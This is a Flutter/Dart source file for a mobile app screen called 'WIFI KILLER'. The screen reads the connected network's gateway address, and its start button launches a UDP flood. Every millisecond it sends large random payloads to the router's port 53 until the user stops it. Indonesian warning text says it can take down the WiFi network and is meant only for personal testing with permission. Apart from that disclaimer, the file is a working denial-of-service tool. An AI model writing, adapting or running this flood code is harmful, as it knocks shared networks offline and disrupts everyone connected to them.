// wifi_internal.dart
// ═══════════════════════════════════════════════════════════════════════════
// WIFI KILLER (INTERNAL) — GLASSMORPHISM EDITION
// ═══════════════════════════════════════════════════════════════════════════
import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'glass_theme.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied",
          "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload =
        List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(const Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket =
              await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    GlassDialog.show(
      context,
      title: title,
      message: message,
      icon: Icons.wifi_off_rounded,
      accentColor: GlassPalette.red,
    );
  }

  Widget _buildInfoRow(String label, String value) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 6),
      padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 12),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.06),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(
          color: Colors.white.withOpacity(0.2),
          width: 1.2,
        ),
      ),
      child: Row(
        children: [
          Text(
            "$label:",
            style: GlassFont.body(
              size: 12,
              weight: FontWeight.w700,
              color: GlassPalette.textSub,
            ),
          ),
          Expanded(
            child: Text(
              value,
              textAlign: TextAlign.right,
              style: GlassFont.body(
                size: 12,
                weight: FontWeight.w700,
                color: GlassPalette.text,
              ),
            ),
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: GlassPalette.bg,
      extendBodyBehindAppBar: true,
      body: GlassBg(
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              Expanded(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(16),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      // ICON
                      Center(
                        child: Container(
                          padding: const EdgeInsets.all(20),
                          decoration: BoxDecoration(
                            color: GlassPalette.red.withOpacity(0.25),
                            borderRadius: BorderRadius.circular(20),
                            border: Border.all(
                              color: GlassPalette.red.withOpacity(0.7),
                              width: 1.5,
                            ),
                            boxShadow: [
                              BoxShadow(
                                color: GlassPalette.red.withOpacity(0.5),
                                blurRadius: 20,
                              ),
                            ],
                          ),
                          child: const Icon(Icons.wifi_off,
                              color: GlassPalette.white, size: 46),
                        ),
                      ),
                      const SizedBox(height: 22),

                      // WARNING
                      GlassCard(
                        borderWidth: 1.5,
                        radius: 20,
                        padding: const EdgeInsets.all(16),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Row(
                              children: [
                                Container(
                                  padding: const EdgeInsets.all(6),
                                  decoration: BoxDecoration(
                                    color: GlassPalette.red
                                        .withOpacity(0.25),
                                    borderRadius: BorderRadius.circular(8),
                                    border: Border.all(
                                      color: GlassPalette.red
                                          .withOpacity(0.7),
                                      width: 1.2,
                                    ),
                                  ),
                                  child: const Icon(Icons.warning,
                                      color: GlassPalette.white, size: 14),
                                ),
                                const SizedBox(width: 10),
                                Text(
                                  "Warning",
                                  style: GlassFont.pixel(
                                    size: 9,
                                    weight: FontWeight.w700,
                                    color: GlassPalette.red,
                                  ),
                                ),
                              ],
                            ),
                            const SizedBox(height: 12),
                            Text(
                              "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n\nGunakan hanya untuk testing pribadi. Risiko ditanggung pengguna.",
                              style: GlassFont.body(
                                size: 11,
                                weight: FontWeight.w600,
                                color: GlassPalette.textSub,
                                height: 1.5,
                              ),
                            ),
                          ],
                        ),
                      ),

                      const SizedBox(height: 16),

                      // NETWORK INFO
                      GlassCard(
                        borderWidth: 1.5,
                        radius: 20,
                        padding: const EdgeInsets.all(16),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Row(
                              children: [
                                Container(
                                  padding: const EdgeInsets.all(6),
                                  decoration: BoxDecoration(
                                    color: GlassPalette.teal
                                        .withOpacity(0.25),
                                    borderRadius: BorderRadius.circular(8),
                                    border: Border.all(
                                      color: GlassPalette.teal
                                          .withOpacity(0.6),
                                      width: 1.2,
                                    ),
                                  ),
                                  child: const Icon(Icons.network_wifi,
                                      color: GlassPalette.white, size: 16),
                                ),
                                const SizedBox(width: 12),
                                Text(
                                  "Network Information",
                                  style: GlassFont.pixel(
                                    size: 9,
                                    weight: FontWeight.w700,
                                    color: GlassPalette.text,
                                  ),
                                ),
                              ],
                            ),
                            const SizedBox(height: 14),
                            _buildInfoRow("SSID", ssid),
                            _buildInfoRow("IP Address", ip),
                            _buildInfoRow("Frequency", "$frequency MHz"),
                            _buildInfoRow("Router IP", routerIp),
                          ],
                        ),
                      ),

                      const SizedBox(height: 22),

                      // BUTTON
                      GlassButton(
                        text: isKilling ? 'STOP ATTACK' : 'START KILL',
                        icon: isKilling ? Icons.stop : Icons.wifi_off,
                        onTap: isKilling ? _stopFlood : _startFlood,
                        bgColor: isKilling
                            ? GlassPalette.red
                            : GlassPalette.yellow,
                        textColor: isKilling
                            ? GlassPalette.white
                            : GlassPalette.black,
                        padding: const EdgeInsets.symmetric(vertical: 16),
                        fontSize: 11,
                      ),

                      const SizedBox(height: 20),

                      if (isKilling)
                        Center(
                          child: Column(
                            children: [
                              Container(
                                padding: const EdgeInsets.all(16),
                                decoration: BoxDecoration(
                                  color:
                                      GlassPalette.red.withOpacity(0.25),
                                  borderRadius: BorderRadius.circular(16),
                                  border: Border.all(
                                    color: GlassPalette.red
                                        .withOpacity(0.7),
                                    width: 1.5,
                                  ),
                                  boxShadow: [
                                    BoxShadow(
                                      color: GlassPalette.red
                                          .withOpacity(0.5),
                                      blurRadius: 20,
                                    ),
                                  ],
                                ),
                                child: const CircularProgressIndicator(
                                  color: GlassPalette.white,
                                  strokeWidth: 3,
                                ),
                              ),
                              const SizedBox(height: 16),
                              Text(
                                "Attack in progress...",
                                style: GlassFont.pixel(
                                  size: 9,
                                  weight: FontWeight.w700,
                                  color: GlassPalette.red,
                                ),
                              ),
                            ],
                          ),
                        ),

                      const SizedBox(height: 16),

                      GlassCard(
                        borderWidth: 1.5,
                        radius: 16,
                        padding: const EdgeInsets.all(14),
                        child: Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.all(6),
                              decoration: BoxDecoration(
                                color: GlassPalette.blue
                                    .withOpacity(0.25),
                                borderRadius: BorderRadius.circular(8),
                                border: Border.all(
                                  color: GlassPalette.blue
                                      .withOpacity(0.6),
                                  width: 1.2,
                                ),
                              ),
                              child: const Icon(Icons.info,
                                  color: GlassPalette.white, size: 14),
                            ),
                            const SizedBox(width: 12),
                            Expanded(
                              child: Text(
                                "Pastikan Anda memiliki izin sebelum menggunakan tool ini",
                                style: GlassFont.body(
                                  size: 10,
                                  weight: FontWeight.w600,
                                  color: GlassPalette.textSub,
                                ),
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 10, 16, 10),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                  color: Colors.white.withOpacity(0.25),
                  width: 1.2,
                ),
              ),
              child: const Icon(Icons.arrow_back_rounded,
                  color: GlassPalette.white, size: 20),
            ),
          ),
          const SizedBox(width: 12),
          Text(
            'WIFI KILLER',
            style: GlassFont.pixel(
              size: 10,
              weight: FontWeight.w700,
              color: GlassPalette.text,
              letterSpacing: 1.5,
            ),
          ),
        ],
      ),
    );
  }
}